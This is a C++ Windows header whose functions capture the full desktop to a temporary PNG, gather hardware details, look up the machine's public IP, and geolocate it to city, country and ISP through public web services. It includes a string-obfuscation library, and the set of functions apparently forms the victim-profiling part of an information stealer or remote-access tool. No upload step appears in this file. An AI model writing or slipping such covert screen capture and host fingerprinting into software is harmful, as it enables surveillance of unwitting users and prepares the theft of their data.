#pragma once

#include <Windows.h>
#include <iostream>
#include <array>
#include <sstream>

#include <winhttp.h>
#include "oxorany.h"
#include <vector>
#include <gdiplus.h>
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "gdiplus.lib")

using namespace Gdiplus;

// --- GDI+ Helper ---
inline int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
    UINT num = 0, size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;
    GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    free(pImageCodecInfo);
    return -1;
}

inline std::string save_screenshot()
{
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);

    int virtWidth = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int virtHeight = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y = GetSystemMetrics(SM_YVIRTUALSCREEN);

    int width = virtWidth;
    int height = virtHeight;

    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcMem, hBitmap);
    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, x, y, SRCCOPY | CAPTUREBLT);

    char tmpPath[MAX_PATH], tmpFile[MAX_PATH];
    GetTempPathA(MAX_PATH, tmpPath);
    GetTempFileNameA(tmpPath, "ss", 0, tmpFile);
    
    // Change extension to .png
    std::string pngFile = std::string(tmpFile) + ".png";
    std::wstring wPngFile(pngFile.begin(), pngFile.end());

    Bitmap* bitmap = new Bitmap(hBitmap, NULL);
    CLSID pngClsid;
    GetEncoderClsid(L"image/png", &pngClsid);
    bitmap->Save(wPngFile.c_str(), &pngClsid, NULL);

    delete bitmap;
    SelectObject(hdcMem, hOldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
    GdiplusShutdown(gdiplusToken);

    return pngFile;
}


inline std::string find_manufacturer()
{
    HKEY hKey;
    const char* regPath = ("HARDWARE\\DESCRIPTION\\System\\BIOS");
    const char* valueName = ("BaseBoardManufacturer");
    char buffer[256] = { 0 };
    DWORD bufferSize = sizeof(buffer);

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, regPath, 0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return "Unknown";

    if (RegQueryValueExA(hKey, valueName, nullptr, nullptr, reinterpret_cast<LPBYTE>(buffer), &bufferSize) != ERROR_SUCCESS)
    {
        RegCloseKey(hKey);
        return "Unknown";
    }

    RegCloseKey(hKey);
    return std::string(buffer);
}

inline std::string find_product()
{
    HKEY hKey;
    const char* regPath = ("HARDWARE\\DESCRIPTION\\System\\BIOS");
    const char* valueName = ("BaseBoardProduct");
    char buffer[256] = { 0 };
    DWORD bufferSize = sizeof(buffer);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, regPath, 0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return "Unknown";
    if (RegQueryValueExA(hKey, valueName, nullptr, nullptr, reinterpret_cast<LPBYTE>(buffer), &bufferSize) != ERROR_SUCCESS)
    {
        RegCloseKey(hKey);
        return "Unknown";
    }
    RegCloseKey(hKey);
    return std::string(buffer);
}

inline std::string find_local_ip() {
    HINTERNET hSession = WinHttpOpen(L"IP Checker", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return "Unknown";

    HINTERNET hConnect = WinHttpConnect(hSession, L"api.ipify.org", INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return "Unknown"; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", NULL, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    std::string ip = "Unknown";

    if (hRequest && WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        if (WinHttpReceiveResponse(hRequest, NULL)) {
            char buffer[64];
            DWORD bytesRead = 0;
            if (WinHttpReadData(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
                buffer[bytesRead] = '\0';
                ip = buffer;
            }
        }
    }

    if (hRequest) WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return ip;
}

inline std::string get_gpu_information() {
    std::string gpuInfo = ("Unknown");
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, ("HARDWARE\\DEVICEMAP\\VIDEO"), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char buffer[512] = { 0 };
        DWORD bufferSize = sizeof(buffer);
        DWORD type = 0;
        if (RegQueryValueExA(hKey, ("\\Device\\Video0"), NULL, &type, (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
            std::string regPath = buffer;
            size_t pos = regPath.find(("\\Registry\\Machine\\"));
            if (pos != std::string::npos) {
                regPath = regPath.substr(pos + 18);
            }

            RegCloseKey(hKey);

            HKEY hDeviceKey;
            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, regPath.c_str(), 0, KEY_READ, &hDeviceKey) == ERROR_SUCCESS) {
                bufferSize = sizeof(buffer);
                if (RegQueryValueExA(hDeviceKey, ("DriverDesc"), NULL, NULL, (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
                    gpuInfo = buffer;
                }
                RegCloseKey(hDeviceKey);
            }
        }
        else {
            RegCloseKey(hKey);
        }
    }
    return gpuInfo;
}


inline std::string get_disk_information() {
    ULARGE_INTEGER freeBytes, totalBytes, totalFreeBytes;

    if (GetDiskFreeSpaceExA(("C:"), &freeBytes, &totalBytes, &totalFreeBytes)) {
        DWORDLONG totalGB = totalBytes.QuadPart / (1024 * 1024 * 1024);
        DWORDLONG freeGB = freeBytes.QuadPart / (1024 * 1024 * 1024);

        std::stringstream ss;
        ss << totalGB << ("GB Total / ") << freeGB << ("GB Free");
        return ss.str();
    }
    return ("Unknown");
}

inline std::string get_ram_information() {
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);

    DWORDLONG totalRAM = memInfo.ullTotalPhys / (1024 * 1024 * 1024);
    DWORDLONG availableRAM = memInfo.ullAvailPhys / (1024 * 1024 * 1024);

    std::stringstream ss;
    ss << totalRAM << ("GB Total / ") << availableRAM << ("GB Free");
    return ss.str();
}

inline std::string get_cpu_information() {
    int CPUInfo[4] = { -1 };
    char CPUBrandString[0x40] = { 0 };
    __cpuid(CPUInfo, 0x80000002);
    memcpy(CPUBrandString, CPUInfo, sizeof(CPUInfo));
    __cpuid(CPUInfo, 0x80000003);
    memcpy(CPUBrandString + 16, CPUInfo, sizeof(CPUInfo));
    __cpuid(CPUInfo, 0x80000004);
    memcpy(CPUBrandString + 32, CPUInfo, sizeof(CPUInfo));
    return std::string(CPUBrandString);
}

inline std::string extractjsonfield(const std::string& json, const std::string& field) {
    std::string searchStr = ("\"") + field + ("\":\"");
    size_t start = json.find(searchStr);
    if (start == std::string::npos) return ("");

    start += searchStr.length();
    size_t end = json.find(("\""), start);
    if (end == std::string::npos) return ("");

    return json.substr(start, end - start);
}

inline std::string get_location() {
    std::string publicIP = find_local_ip();
    if (publicIP == "Unknown") return "Unknown";

    HINTERNET hSession = WinHttpOpen(L"Location Checker", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return "Unknown";

    std::wstring wIP(publicIP.begin(), publicIP.end());
    HINTERNET hConnect = WinHttpConnect(hSession, L"ip-api.com", INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return "Unknown"; }

    std::wstring wPath = L"/json/" + wIP + L"?fields=status,country,city,isp,org";
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", wPath.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    
    std::string jsonResponse;
    if (hRequest && WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        if (WinHttpReceiveResponse(hRequest, NULL)) {
            char buffer[1024];
            DWORD bytesRead = 0;
            while (WinHttpReadData(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
                buffer[bytesRead] = '\0';
                jsonResponse += buffer;
            }
        }
    }

    if (hRequest) WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    if (jsonResponse.find("\"status\":\"success\"") != std::string::npos) {
        std::string country = extractjsonfield(jsonResponse, "country");
        std::string city = extractjsonfield(jsonResponse, "city");
        std::string isp = extractjsonfield(jsonResponse, "isp");

        if (!country.empty() && !city.empty()) {
            return city + ", " + country + " (" + isp + ")";
        }
    }

    return "Unknown";
}
